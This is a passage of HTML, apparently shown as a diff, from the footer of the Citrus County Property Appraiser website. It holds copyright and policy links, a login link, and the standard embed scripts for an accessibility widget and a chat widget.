+</div></div></div></div> </div></div> </div></div> </div></div> </div></div> </div></div> <div class="container-fluid row-no-spacing color-white" id="row-514475"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-3 col-sm-6"><div class="dng-column-inner " id="column-102978"> <div id="dnn_FooterPaneA" class="panebox FooterPaneA footer-center mt-25 mb-50 DNNEmptyPane"></div></div></div><div class="dng-column col-md-3 col-sm-6"><div class="dng-column-inner " id="column-933543"> <div id="dnn_FooterPaneB" class="panebox FooterPaneB footer-center mt-25 mb-50 DNNEmptyPane"></div></div></div><div class="dng-column col-md-3 col-sm-6"><div class="dng-column-inner " id="column-39798"> <div id="dnn_FooterPaneC" class="panebox FooterPaneC footer-center mt-25 mb-50 DNNEmptyPane"></div></div></div><div class="dng-column col-md-3 col-sm-6"><div class="dng-column-inner " id="column-456323"> <div id="dnn_FooterPaneD" class="panebox FooterPaneD footer-center mt-25 mb-50 DNNEmptyPane"></div></div></div> </div></div></div> <div class="container-fluid row-no-spacing " id="row-781151"><div class="container"><div class="column-gap-0 dng-row row"> <div class="dng-column col-md-8"><div class="dng-column-inner " id="column-64895"> <div class="footer-info-box" id="footerinfo628747"><span id="dnn_dnnCOPYRIGHT628747_lblCopyright" class="footer">Copyright 2026 by Citrus County Property Appraiser</span>
+<span class="sep">|</span><a id="dnn_dnnPRIVACY628747_hypPrivacy" class="terms" rel="nofollow" href="https://www.citruspa.org/_dnn/Privacy">Privacy Statement</a><span class="sep">|</span><a id="dnn_dnnTERMS628747_hypTerms" class="terms" rel="nofollow" href="https://www.citruspa.org/_dnn/Terms">Terms Of Use</a></div><div class="dngTextBox"><div id="footerinfo628747" style="padding-top: 15px;"><a class="terms" href="https://engagedigitalservices.com/" target="_blank">Website Design by Engage Digital Services</a> | <a class="terms" href="https://engagedigitalservices.com/" target="_blank">Website Design St. Louis</a></div></div></div></div> <div class="dng-column col-md-4"><div class="dng-column-inner text-right" id="column-703667"> <div id="UserLogin718441" class="footer-logoin">
+<span class="sep">|</span><a id="dnn_dnnLogin718441_loginLink" title="Login" class="LoginLink" rel="nofollow" onclick="return dnnModal.show(&#39;https://www.citruspa.org/_dnn/Login?returnurl=/_dnn/default.aspx&amp;popUp=true&#39;,/*showReturn*/true,300,650,true,&#39;&#39;)" href="https://www.citruspa.org/_dnn/Login?returnurl=%2f_dnn%2fdefault.aspx">Login</a>
+</div><div class="dngTextBox"><script>(function(){var s = document.createElement("script");s.setAttribute("data-account","sCIl0sQhO2");s.setAttribute("src","https://cdn.userway.org/widget.js");document.body.appendChild(s);})();</script><noscript>Enable JavaScript to ensure <a href="https://userway.org">website accessibility</a></noscript></div><div class="dngTextBox"><script>
+  window.intercomSettings = {
+    app_id: "dd56294v"
+  };
+</script>
+
+<script>
+// We pre-filled your app ID in the widget URL: 'https://widget.intercom.io/widget/dd56294v'
+(function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/dd56294v';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
+</script></div></div></div> </div></div></div> 
+        </footer>
+        <div id="back-to-top" class="backtop01"><span></span></div>
+      </div>
+</div>
+<div data-path="/_dnn/Portals/_default/Skins/dng-theme-pro/" id="SkinPath"></div>
+
+<script type="text/javascript" src="/_dnn/Portals/_default/Skins/dng-theme-pro/global-0.js"></script> 
+
+
+        <input name="ScrollTop" type="hidden" id="ScrollTop">
+        <input name="__dnnVariable" type="hidden" id="__dnnVariable" autocomplete="off">
+        
+        
+    </form>
+    
+</body>
+</html>
